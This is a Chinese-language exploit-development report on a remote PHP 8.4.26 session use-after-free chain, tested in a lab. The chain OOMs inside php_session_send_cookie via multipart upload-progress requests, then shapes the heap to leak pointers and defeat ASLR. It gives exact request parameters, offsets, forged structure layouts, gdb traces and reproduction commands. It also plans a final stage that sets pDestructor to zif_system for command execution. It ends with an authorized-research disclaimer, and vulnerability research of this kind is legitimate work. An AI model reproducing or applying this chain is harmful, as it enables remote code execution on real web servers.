# 不依赖 `display_errors` 的纯 HTTP 链：进展与剩余标定

日期：2026-10-21
目标：PHP 8.4.26 + Apache 2.4.68 prefork + mod_php（`172.16.0.103`，
`display_errors=0`、`memory_limit=8M`、单 worker）
约束：完全远程、只发普通 multipart HTTP；目标页面是
`<?php echo "OK\n"; ?>`（无 `session_start()`）；不读目标 `/proc`。

---

## 1. 结论（当前状态）

已经在 `display_errors=0` 下打通了**不依赖警告输出的 OOM-in-cookie 原语**：

1. A 请求在 `php_session_send_cookie()` 内部、`php_url_encode()` 的第一笔
   `zend_string_safe_alloc(3, 32, 0, 0)`（121B → bin 128）处 OOM；
2. OOM 发生在 `PS(send_cookie)=1` 之后、`PS(send_cookie)=0` 之前，
   请求 bailout，`PS(id)`（32 字符随机 id）与 `PS(send_cookie)=1` 残留；
3. 没有任何 PHP 警告/输出参与，`SG(headers_sent)` 始终为 0；
4. 后续 B 请求的 pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup()
   → php_session_initialize()` 已能穿过 A 遗留的 `PS(mod_data)` 清理，
   用**悬空 `PS(id)`** 调用 `php_session_send_cookie()`（`RESET_ID`/`SEND_COOKIE`
   断点已实测命中，`send_cookie=1`）。

剩余一步是 B 侧把悬空 id 块重新占成伪造 `zend_string` 头（让 `url_encode`
读一个受控大长度），同时让 `php_rshutdown_session_globals()` 释放该 id 时
不再触发 `zend_mm_panic`。**这一步也已完成**：B 用两个大字段把 cached id
chunk 铺到 page 510，让第二个字段的存活副本正好落在 pages 257–511，并在
page 511 的对应偏移写入伪造头 + 尾部未初始化区；`url_encode` 读出 4000 字节，
其中后 3000 字节是 A 残留在 page 511 尾部的 bin-64 freelist 指针。

实测（`display_errors=0`）：

```text
Set-Cookie: PHPSESSID=MMMM...（1000 字节 M，后接 4000 字节解码结果）
decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000     # no-ASLR
decoded=4000 ptrs=47 chunk_base=0x7f9acd000000     # ASLR-on
decoded=4000 ptrs=47 chunk_base=0x7f1416e00000     # ASLR-on
```

无 ASLR 3/3、ASLR 开启 2/2（均在确认 `display_errors 0` 的配置下）；失败样本只是未命中 page 511（返回正常
32 字节 cookie），不崩溃。

### 1.1 目标页面不需要 `session_start`

本轮测试的目标页面是：

```php
<?php echo "OK\n"; ?>
```

没有 `session_start()`。整条链仍然成立，因为 session 初始化发生在 RINIT
之前的 `session.upload_progress` 回调里：

- A：`MULTIPART_EVENT_FILE_START → php_session_rfc1867_update →
  php_session_initialize()`；
- B：`MULTIPART_EVENT_END → php_session_rfc1867_cleanup →
  php_session_initialize()`。

两者都在脚本执行之前，所以页面是否调用 `session_start()` 与漏洞链无关。
实测（同一无 session 页面）：

- `display_errors=0` 的 forge 泄漏：4000 字节 / 47 个指针，chunk base
  `0x7ffff3e00000`（证据 `logs/nosession_forge_20261021.resp`）；
- 旧 `display_errors=1` 阶段 1 泄漏：4096 字节 / 98 个指针，chunk base
  `0x7ffff5e00000`（证据 `logs/nosession_classic_leak_20261021.resp`）。


---

## 2. 为什么旧链依赖 `display_errors`

旧 A 用 `max_input_vars` 警告把 `SG(headers_sent)` 置 1，使
`php_session_send_cookie()` 返回 `FAILURE`：

```c
if (SG(headers_sent)) { ... return FAILURE; }   /* send_cookie 仍为 1 */
```

`php_session_reset_id()` 返回 `FAILURE` → `php_session_initialize()` 调
`php_session_abort()` → `ps_close_files()` 正常释放 `PS(mod_data)`（置 NULL）。
于是 B 的 `s_open` 看到 `mod_data == NULL`，不会碰悬空指针；
B 只需用 raw buffer 重占悬空 id 块即可。

`display_errors=0` 时警告没有输出，`headers_sent` 不会置位，这条“FAILURE +
abort”路径消失。只能让 OOM 直接发生在 `send_cookie` 内部：

- `send_cookie` 不会返回，`PS(send_cookie)=1` 保留；
- 但 `php_session_abort()` 也不会执行，`PS(mod_data)` 变成悬空指针；
- B 的 `s_open` 会先 `ps_close_files(悬空 mod_data)`，这是新问题。

---

## 3. A：OOM-in-cookie 的分配事实

`php_session_send_cookie()`（8.4.26）第一笔分配：

```c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

`php_url_encode_impl()`：

```c
start = zend_string_safe_alloc(3, len, 0, 0);   // len = 32
```

请求大小 = `24 + 3*32 + 1 = 121` → **bin 128**（1 页 run，32 槽）。
只要在 `send_cookie` 入口同时满足：

- `heap->free_slot[11] == NULL`（bin 128 空）
- 四个 chunk 的 `free_pages` 总和为 0

这笔分配就会走 `zend_mm_alloc_small_slow(heap, 11)` →
`zend_mm_alloc_pages(1)` → 无 free page → `zend_mm_safe_error` → bailout。

### 3.1 请求形状

`tools/send_a_oom5.py`，实测稳定参数：

```text
F=0  S=62  NB=235  BL=15000  X=208  K=0  KL=4000  FL=103
```

- **S=62 单名字段**：名字 103B（zend_string = 128 → bin 128），值 8B。
  每个字段的 filter 值副本是 bin 40；名字贡献 1 个 bin-128 活块。
  文件部分（字段名 103B + filename 103B）再贡献 2 个 bin-128 活块。
  总计 `62 + 2 = 64 = 2×32` → `free_slot[11]` 恰好为空。
  （注意：103B 值的字段会贡献 3 个 bin-128 活块，所以这里必须用 8B 值。）
- **NB×BL = 235 × 15000B**：大字段填内存；每个值有 2 份活拷贝
  （`IF_G(post_array)` + `$_POST`），每份 `25+15000` → 4 页，共 8 页/字段。
- **X=208 个 231B 值**：bin 256（16 槽/页），每个字段 2 个活槽 + 1 个瞬时
  raw 槽；每 8 个字段触发一个新 256B run（1 页），用来做 1 页粒度收尾。

### 3.2 gdb 证据

`logs/oomcookie_A_20261021.log`：

```text
SEND_COOKIE id=0x7ffff3fff000 len=32 size=8253840 real=8388608 limit=8388608
            free_pages=0 chunks=[0,0,0,0] fs7=.../63 fs9=0/0 fs11=0x0/0
MM_SAFE_ERROR real=8388608 limit=8388608 size=8253968
PS_AT_OOM id=0x7ffff3fff000 len=32 send_cookie=1
#3 zend_string_safe_alloc (persistent=false, l=0, m=32, n=3)
#4 php_url_encode_impl (raw=false, len=32, s=0x7ffff3fff018 "...")
#5 php_url_encode
#6 php_session_send_cookie
#7 php_session_reset_id
#8 php_session_initialize
#9 php_session_rfc1867_update
```

关键点：

- `real=8M=limit`：4 个 chunk 已映射，不能再 mmap；
- `free_pages=0`、`fs11=0`：`url_encode` 的 bin-128 run 无处可放；
- OOM 精确落在 `php_url_encode_impl`，而不是解析/大字段阶段；
- `PS_AT_OOM send_cookie=1`：`PS(send_cookie)` 未被清 0，`PS(id)` 仍指向
  32 字符随机 id（`id=0x7ffff3fff000`，位于 chunk `0x7ffff3e00000` 的 page 511）。

A 的响应是 `500 Internal Server Error`、空 body（display_errors=0 没有输出），
worker 存活。

### 3.3 校准方法

`tools/trial_bins.sh` 每次重启 Apache（`setarch -R`）、挂 gdb、发 A，
打印 `SEND_COOKIE` / `MM_SAFE_ERROR`。调 X（±1）可移动
`free_pages` 在 0 与非 0 之间；`fs11` 只由 S 决定（S ≡ 30 mod 32）。
当前 S=62 时 X=206..212 都能命中 `free_pages=0, fs11=0`。

---

## 4. B：穿过悬空 `PS(mod_data)`

### 4.1 崩溃机制

B 的 `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() →
php_session_initialize()`：

```c
PS(mod)->s_open(&PS(mod_data), ...)          /* ps_open_files */
    data = ecalloc(1, sizeof(ps_files));     /* 40B -> bin 40 */
    data->basedir = zend_string_init("/tmp");
    if (PS_GET_MOD_DATA()) ps_close_files(mod_data);   /* <- 悬空指针 */
    PS_SET_MOD_DATA(data);
```

A 的 `PS(mod_data)` 是 `ps_files*`（`ecalloc(1,40)`），地址实测
`0x7ffff5e7f500`（主 chunk + `0x7f500`，bin-40 槽 32）。A 的 shutdown
没有跑 session RSHUTDOWN，所以这个指针悬空。

若 B 的该地址不是合法块，`ps_close_files()` 里 `efree(data)` 触发
`zend_mm_panic("zend_mm_heap corrupted")`（`chunk->heap` 检查）。

### 4.2 解法：让该页在 B 里变成任意 SRUN 页

`zend_mm_free_heap()` 对 SRUN 页**不做块对齐检查**，只检查
`chunk->heap == heap`，随后 `zend_mm_free_small(heap, ptr, bin)` 直接入
freelist。因此只要 B 把 `0x7ffff5e7f500` 所在页（主 chunk page 127）
变成一个小 bin 的 run 页，`efree(data)` 就不会 panic。

实测 B 形状：

```text
N=160 个字段，值长度 231B（bin 256）
```

在 B 的 `ps_open_files` 断点：

```text
new=0x7ffff5e64028 pg=100 info=0x80000004
old=0x7ffff5e7f500 pg=127 chunk_heap=0x7ffff5e00040 match=1 info=0x8000000f
last_key=0x7ffff5e7f600 basedir=0x7ffff5e022c0 fd=-1
```

- page 127 是 SRUN bin 15（256B），槽 5 未被分配（该 run 还有 12 个空槽）；
- `last_key` 是同一 run 的下一个空槽指针（安全）；
- `basedir` 仍是 A 的 `/tmp` zend_string 指针（安全，bin-32 页 SRUN）；
- `fd=-1`。

`ps_close_files` 因此返回，`s_open` 设置一个全新的合法 `mod_data`；
initialize 看到悬空 id 首字节非 0（A 的随机 id 仍完整），跳过 create-id，
直接 `php_session_reset_id()`：

```text
RESET_ID id=0x7ffff3fff000 len=32 send_cookie=1
SEND_COOKIE id=0x7ffff3fff000 len=32 ... free_pages=370 ...
```

**B 已经用悬空 id 调用了 `php_session_send_cookie()`**（因为 A 的 id 仍在，
`send_cookie=1` 仍在）。这一步是旧链里 `display_errors` 依赖的替代。

### 4.3 剩余崩溃：rshutdown 释放悬空 id

`MULTIPART_EVENT_END` 在 cleanup 之后无条件执行：

```c
php_rshutdown_session_globals();
    ...
    if (PS(id)) { zend_string_release_ex(PS(id), 0); PS(id) = NULL; }
```

悬空 id 位于 chunk `0x7ffff3e00000` 的 page 511（页首，地址
`0x7ffff3fff000`）。该 chunk 在 B 里只是 **cached chunk**：

```text
RSHUT_ID id=0x7ffff3fff000 base=0x7ffff3e00000 pg=511
          chunk_heap=0x0 match=0 info=0x0
          bytes=01000000160000000000000000000000   # refcount=1
```

`chunk_heap=0` → `zend_mm_free_heap` 的 `chunk->heap == heap` 检查失败 →
panic。A 的 id zend_string 仍保留 `refcount=1`，所以 release 会尝试 efree。

---

## 5. B 的 forge（已实现）

### 5.1 目标

让 B 在 `send_cookie` 之前用受控内容重占悬空 id 块
（`0x7ffff3e00000 + 0x1ff000`，即该 chunk 的 page 511 槽 0），使：

- `PS(id)+0x10`（len）= 4000；
- `PS(id)+0x00` 在 rshutdown 时不是 refcount=1（free 后是 freelist next）；
- `url_encode` 从 `PS(id)+0x18` 读 4000 字节，前 1000 字节是填充，后 3000
  字节是 A 残留在 page 511 尾部的 bin-64 freelist 指针；
- `url_encode` 的 `3*len` 分配（12000B → 3 页）在 B 里能成功。

### 5.2 两字段铺页

B 的 body 顺序（`send_b_open.py`）：

```text
160 × 231B 值（bin-256 run，把主 chunk page 127 变成 12 空槽的 partial run）
1 × 1,048,551B 值（BB1，zend_string = 256 页）
1 × 1,041,384B 值（BF，zend_string = 255 页，伪造负载）
PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
（无文件部分，走 pre-RINIT END cleanup）
```

分配序列（实测）：

1. BB1 的 raw（256 页）先落在主 chunk 的 free tail，随后被释放；
2. BB1 的两个存活副本之一把 cached id chunk 取出（`chunk_init`），
   落在 pages 1–256；
3. BF 的 raw（255 页）复用主 chunk 的 free tail，随后释放；
4. BF 的存活副本落在 id chunk 的 pages 257–511（因为 257–511 正好 255 页，
   Best-Fit 精确命中），page 511 被覆盖。

于是 `PS(id)`（page 511）落在一个**存活 zend_string 的数据区**里，
数据不会被后续分配改写。

### 5.3 伪造头布局

BF 的分配起点 `S = chunk + 257*4096`，page 511 在 `S + 254*4096`。
zend_string 数据从 `S+0x18` 开始，所以伪造头在 value 内的偏移：

```text
D = (510 - 256) * 4096 = 254 * 4096 = 1,040,384
gc    at D-24 : 0x4141414141414141   （rshutdown 时 refcount != 1）
h     at D-16 : 0
len   at D-8  : 4000
data  at D    : 'M' * 1000，之后 value 结束（L2 = D+1000）
```

BF 的分配大小 `25 + L2 = 1,041,409` → 255 页（正好和 pages 257–511 对齐）。
value 数据在 page 511 内只写到 1000 字节，之后的 ~3000 字节是未初始化区，
保留 A 时代 page 511 尾部的 bin-64 freelist 指针。

### 5.4 实测结果

`SEND_COOKIE id=0x7ffff3fff000 len=4000`；`RSHUT_ID ... bytes=41414141...`
（match=1，不再 panic）；响应 `200 OK`，`Set-Cookie` 解码后 4000 字节：

```text
logs/oomcookie_leak_noaslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000

logs/oomcookie_leak_aslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7f9acd000000
  （另一轮 ASLR: 0x7f1416e00000）
```

47 个指针全部是 chunk 内地址（如 `0x7ffff3fff400/…f480/…f4c0`），
取 2MB 对齐众数即 chunk base。

### 5.5 复现

```bash
# no-ASLR
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

### 5.6 稳定性

- no-ASLR 3/3；ASLR-on 2/2（均在 display_errors=0 下）；
- 失败样本：page 511 未被覆盖，`len` 仍是 32，返回正常 32 字节 cookie，
  不崩溃；重试即可；
- 依赖 `trial_ab.sh` 的 fresh-worker + gdb attach 检查（断点 pending 时重试）。

### 5.7 已验证清单

- [x] `display_errors=0` 下 A 在 `php_url_encode` OOM，`send_cookie=1`
- [x] A 的 `PS(id)` 悬空且跨请求保留
- [x] B 的 `ps_close_files(悬空 mod_data)` 不 panic（SRUN 页 + 空槽对齐）
- [x] B 用悬空 id 调用 `send_cookie`（`RESET_ID`/`SEND_COOKIE` 命中）
- [x] B 取 cached chunk（`chunk_heap != 0`），rshutdown 不再 panic
- [x] 两字段铺页 + BF 副本覆盖 page 511，伪造 len=4000
- [x] `Set-Cookie` 含 47 个 chunk 内指针，chunk base 可解（含 ASLR）

## 6. 剩余工程（stage-2/3）

### 6.1 stage-2 的精确约束（display_errors=0）

stage-2 要读的是真实 HashTable：

```text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
PS(id)+0x18 = HT+0x28 = nNextFreeElement                -> 数据第 1 个 qword
PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> 数据第 2 个 qword
```

因此要么 `PS(id) = HT+0x10`，要么用 page-511 forge 把 len 改大、
让读窗口覆盖后面的真实 HashTable。

当前 0 链的 `PS(id)` 是 cached id chunk 的**最后一页**（page 511，
`chunk+0x1ff000`）。读窗口从 `PS(id)+0x18` 到页尾，最多约 0xF E8 字节，
**不能越出这个 chunk**（后面的地址未映射）。所以：

1. 真实 HashTable 必须落在 page 511 内；
2. page 511 只能承载**一种 bin 的 run**：要么是 bin-56（HashTable
   结构体，56B），要么是承载 forge 的大对象，不能两者共存；
3. 若 page 511 做 bin-56 run：slot 0 放一个已释放的 55B raw buffer
   （+0x10 = 伪造 len，+0x18 = 数据），slot 1 放真实 HashTable
   （pDestructor 在 page+0x68），读窗口刚好覆盖；
4. 但这个 1 页 run 只有在**主 chunk 没有空闲页**时才会落到 id chunk 的
   page 511；当前 B 的主 chunk 仍有 370 个 free page，1 页 run 会优先
   落在主 chunk。

### 6.2 已做的实验

- **晚期大字段**：在 X trimmer 前插一个 50/100 页的字段，其 raw buffer
  释放后尝试在主 chunk 留洞。实测 NB=235 时直接 OOM；NB=215/208 时能到
  `send_cookie`，但 id 仍在 0x3e/0x3d chunk，`url_encode` 也没有落在
  OOM 点（free_pages > 0）。原因是 raw 的 2 份存活拷贝把稳态内存顶满，
  raw 释放的页不足以成为唯一的最后一页。
- **arData 513 次扩容**：把第 513 次 insert 推到 X 尾部会 OOM（需要
  10 页连续空间）；推到 bigs 中段又会把旧 arData 的 4 页洞被后续
  big 的 4 页拷贝精确吃掉。
- **结论**：要完成 stage-2，需要显式的“主 chunk 用存活拷贝铺满 +
  id chunk 留 page 511 + bin-56 run 落 511”三段式堆整形；这是下一步的
  标定工作，不是调一个参数能解决的。

### 6.3 新原语（2026-10-21 晚）：stale id 移位到活字符串内部

上面 5.x 的路径把 `PS(id)` 留在 cached chunk 的 page 511；本轮换了一条
**主 chunk 内、不依赖 page-511 forge** 的路径，已经实测出 16KB 越界读：

1. A 在 `WARM_LEN=60` 的基础上再加一个 32 字节值的字段（`W64_LEN=32`，
   stored zend_string = 24+32+1 = 57 → bin-64）。它先占 page 128 的
   bin-64 run 的 slot 0，`php_session_create_id` 的 32 字节 id 落到
   **slot 1**：`PS(id) = chunk + 0x80080`（page 128 + 0x80）。
2. B 仍用 N=160 个 231B 值字段；page 128 是 bin-256 run，slot 0 是
   一条**存活**的 231B 字符串。`PS(id)=page+0x80` 正好落在这条字符串
   data 区内：
   - id 的 len 字段在 `PS(id)+0x10 = page+0x90 = value[0x78]`；
   - id 的 data 从 `PS(id)+0x18 = page+0x98 = value[0x80]` 开始。
   在**每条**值字符串的 offset 0x78 写入 `0x4000`，offset 0x80 写入
   非零字节（`V`），B 的 `send_cookie` 就会按 0x4000 做 URL-encode：
   header 校验（`ZSTR_VAL(id)[0] != 0`）也通过，因为该字节是我们写的 `V`。
3. 不再需要 free-list/forge 落在 stale 块上，也不需要 cached chunk。

实测参数与结果（no-ASLR，display_errors=0）：

```bash
# A：WARM=60 把 id 主 chunk 化；W64=32 把 id 从 page+0x00 推到 page+0x80
WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
#   MM_SAFE_ERROR 仍在 php_url_encode；PS_AT_OOM send_cookie=1

# B：N=160 个 231B 值，值内 offset 0x78 伪造 len=0x4000
WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
#   Set-Cookie PHPSESSID=...（20616 字符，解码 16392 字节）
```

响应归档：`logs/oomcookie_shift_leak_20261021.resp`。解码后的 16KB 是
page 128 起的 bin-256 字符串槽（每条 `gc=0x…0001, h=0, len=0xe7,
data='V'*231`），即**受控长度、跨槽/跨块的堆读**已经成立；窗口内容目前
全是字段字符串本身，还没有 libphp 代码指针。

### 6.4 stage-2 在新原语下的两个待解约束

要把 16KB 窗口变成 libphp 泄漏，需要窗口里出现**真实 HashTable 结构**
（`pDestructor = libphp+0x613c50` 在 `HT+0x30`）。对齐关系是：

```text
PS(id) = HT + 0x10
  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
  id+0x18 = HT+0x28 = nNextFreeElement                -> 数据[0]
  id+0x20 = HT+0x30 = pDestructor                     -> 数据[8]
```

当前 A 的 `PS(id)=page128+0x80` 正好等于 bin-56 run 的 **slot 2 + 0x10**
（bin-56 槽步长 0x38，slot2=0x70），所以只要 B 的 bin-56 run 落在
page 128，且 slot 2 是一个 `nTableSize>=16` 的数组 HashTable，就能直接
泄漏 `pDestructor`。实测两个卡点：

1. **bin-56 的 free-list 起点**：B 的 `SESSION_INIT` 时 bin-6
   （56B）free chain 长度是 **64**（一整个空页，来自 A 的 request
   shutdown）。必须先消耗这 64 个槽，第 65 个 HashTable 才会建新 run；
   而数组字段的 key/value 字符串（bin-32/40/48）会在这之前先建自己的
   run，把 page 128 抢走（实测 page 128 变成 bin-3/bin-4，id 读到
   garbage/len=1）。
2. **page 127 的 stale `ps_files`**：display_errors=0 的 A 在
   `php_url_encode` 内 OOM，`php_session_abort()` 没跑，`PS(mod_data)`
   仍是悬空 ps_files（page 127 + 0x500）。B 的 END cleanup 会先
   `ps_close_files` 再 `send_cookie`。page 127 必须被 B 重新分配成
   **合适 bin 的 SRUN 页**，且 `+0x500` 槽不能是存活字符串（否则
   `last_key/basedir` 读到 zend_string 头，`zend_string_release` 崩溃）。
   5.x 的 N=160 形状恰好让 page 127 成为 bin-256 且 slot 5 空闲；
   加入数组/尾部字段后，page 127 会变 free/bin-32/bin-40，触发
   `zend_mm_panic` 或 SIGSEGV。当前尚未找到同时满足
   “page 127 slot5 安全 + page 128 bin-56 run slot2 是 HashTable” 的
   字段序列。

这两点是 stage-2 的纯标定问题；stage-3 的 `zif_system` 终端
（`pDestructor=zif_system`、fake execute_data）可在 stage-2 给出
libphp base 后直接复用 `send_b_zif.py`，只差 fake HT/fake-ref 地址
按新形状重标。

### 6.5 stage-3

`zif_system` 终端（`pDestructor=zif_system`，fake execute_data）不依赖
libc；一旦 stage-2 给出 libphp base，可直接复用 `send_b_zif.py` 的
payload，只需按 0 链的 A/B 形状重新标定 fake HT 地址与 fake-ref 落点。


## 7. 文件与命令

| 文件 | 用途 |
|---|---|
| `tools/send_a_oom5.py` | A：S 个 103B 名字/8B 值 + NB 大字段 + X 个 231B 值 + 文件部分；可选 `AQ_N/AQ_LEN` GET padding、`WARM_LEN`、`W64_LEN`（bin-64 移位） |
| `tools/send_b_open.py` | B：N 个 231B 值 + PHPSESSID + PROGRESS，无文件部分；`BB1_LEN` 铺页、`BF_P1/BF_READ` forge、`BVAL_OFF/BVAL_LEN` 值内伪造 len、`BUNIQ/DUP_*` 唯一值/同名字段、`NEST_*` 嵌套数组、`TAIL231/232` 尾字段；可选 Cookie/Header/GET padding |
| `tools/trial_bins.sh` | A-only 标定（重启 + gdb + 发 A） |
| `tools/trial_ab.sh` | fresh worker + gdb 断点解析后发 A/B；`ASLR_ON=1` 时不开 `setarch -R` |
| `tools/g_bins.gdb` | gdb 探针：`SEND_COOKIE`、`OPEN_FILES`、`RESET_ID`、`RSHUT_ID`、`MM_SAFE_ERROR`、chunk/page map、cached chunks、bin15 空槽统计 |
| `logs/oomcookie_A_20261021.log` | A 的 gdb 证据（OOM 精确落点） |
| `logs/oomcookie_AB_20261021.log` | A+B 证据（穿过 mod_data、B 的 send_cookie、旧形状 rshutdown panic） |
| `logs/oomcookie_forge_aslr_20261021.gdb.log` | forge 成功的 gdb 轨迹（len=4000、RSHUT bytes=4141…） |
| `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR 泄漏响应（decoded 4000, 47 ptrs, base 0x7ffff3e00000） |
| `logs/oomcookie_leak_aslr_20261021.resp` | ASLR 泄漏响应（base 0x7f9acd000000） |
| `logs/oomcookie_leak_decode_20261021.txt` | 解码结果摘要 |
| `logs/oomcookie_shift_leak_20261021.resp` | 移位 id 原语的 16KB 泄漏响应（len=16384, 20616 字符） |

复现（目标机 `~/php2shell-work`）：

```bash
# A-only：确认 OOM-in-cookie
./trial_bins.sh 0 62 235 15000 208 0 4000 103

# A + B（穿过 mod_data，尚未覆盖 page 511）
BN=160 BVL=231 ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# A + B forge（chunk 泄漏）
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

gdb 关键输出应包含：

```text
SEND_COOKIE id=0x... len=32 free_pages=0 fs11=0x0/0
MM_SAFE_ERROR ... zend_string_safe_alloc(l=0, m=32, n=3) <- php_url_encode
PS_AT_OOM ... send_cookie=1
SESSION_INIT (B) id=0x7ffff3fff000 len=32 send_cookie=1
OPEN_FILES old=... info=0x8000000f last_key=... basedir=... fd=-1
RESET_ID id=0x7ffff3fff000 send_cookie=1
SEND_COOKIE (B) id=0x7ffff3fff000 len=4000
RSHUT_ID ... bytes=4141414141414141... match=1
```

---

## 8. 免责声明

仅用于授权环境中的漏洞研究与复现。请求形状、bin 序列与偏移绑定本 lab 的
PHP 8.4.26 构建、8M memory_limit、files save handler 与单 worker prefork；
换构建/配置需重新标定。
